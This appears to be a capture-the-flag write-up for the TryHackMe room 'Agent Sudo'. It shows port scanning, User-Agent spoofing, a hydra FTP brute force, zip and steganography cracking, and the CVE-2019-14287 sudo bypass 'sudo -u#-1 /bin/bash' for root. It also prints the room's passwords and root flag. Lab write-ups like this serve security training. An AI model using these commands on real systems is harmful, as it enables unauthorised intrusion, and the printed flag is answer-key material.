🛡️ TryHackMe – Agent Sudo
---

📌 Overview
Room Name: Agent Sudo

Platform: TryHackMe

Difficulty: Easy

Category: Web / Steganography / Privilege Escalation

This challenge involves a series of steps starting from Web enumeration (User-Agent manipulation), hash cracking, multi-layered steganography analysis, and exploiting a known Sudo vulnerability (CVE-2019-14287) to achieve root access.

---

🔍 1. Enumeration Phase
🔎 Service Scanning

The initial reconnaissance was performed using `rustscan` to identify open ports on the target machine.

```

rustscan -a <TARGET_IP>

```

Results:

• `21/tcp`: FTP (vsftpd 3.0.3)

• `22/tcp`: SSH (OpenSSH 7.6p1)

• `80/tcp`: HTTP (Apache 2.4.29)

🌐 Web Directory Discovery

The root page on port 80 instructed: "Use your own codename as user-agent to access the site". By testing codenames via `Burp Suite`, I identified Agent `C` as the correct User-Agent. This redirected to `agent_C_attention.php`, revealing the username `chris` and a hint about a weak password.

---

🔓 2. Initial Access
🔑 FTP Brute Force

Using `hydra` to attack the FTP service with the username `chris`:

```

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>

```

• Result: `crystal`

📦 Steganography Analysis

I retrieved three files from the FTP server: `To_agentJ.txt`, `cutie.png`, and `cute-alien.jpg`.

Layer 1: PNG Analysis (`cutie.png`) `binwalk` revealed a hidden Zip archive. I cracked its password using `johntheripper`:

```

binwalk -e cutie.png

zip2john 8702.zip > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```

• Zip Password: `alien`

• Finding: `To_agentR.txt` contained a Base64 string `QXJlYTUx` -> `Area51`.

Layer 2: JPEG Analysis (`cute-alien.jpg`) Using `Area51` as the passphrase for `steghide`:

```

steghide extract -sf cute-alien.jpg

```

• Result: `message.txt` revealed SSH credentials for user `james`: `hackerrules!`.

---

🚀 3. Privilege Escalation
🔍 Identifying the Vector

After logging in as `james` via SSH, I checked the sudo permissions:

```

sudo -l

# (ALL, !root) /bin/bash

```

The version was `Sudo 1.8.21p2`. This configuration is vulnerable to CVE-2019-14287, which allows a security bypass by specifying the UID as `-1`.

🔓 Gaining Root Shell

Exploiting the logic flaw to bypass the `!root` restriction and spawn a root shell:

```

sudo -u#-1 /bin/bash

```

Status: Root access obtained.

Root Flag:

```

b53a02f55b57d4439e3341834d70c062

```

---

🏁 4. Conclusion & Key Takeaways
🔐 Security Lessons

• Headers are not Security: Never trust `User-Agent` headers for authentication; they are easily spoofed.

• Deep Steganography: CTFs often hide data in nested layers (Image > Zip > Text). Always check for appended data and use specialized tools.

• Sudo Configuration Risk: The `(ALL, !root)` configuration is dangerous on older Sudo versions. Always keep core binaries updated to the latest version.

• Credential Hygiene: Avoid weak passwords (e.g., `crystal`) and never store sensitive credentials in cleartext files like `message.txt`.

---

✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
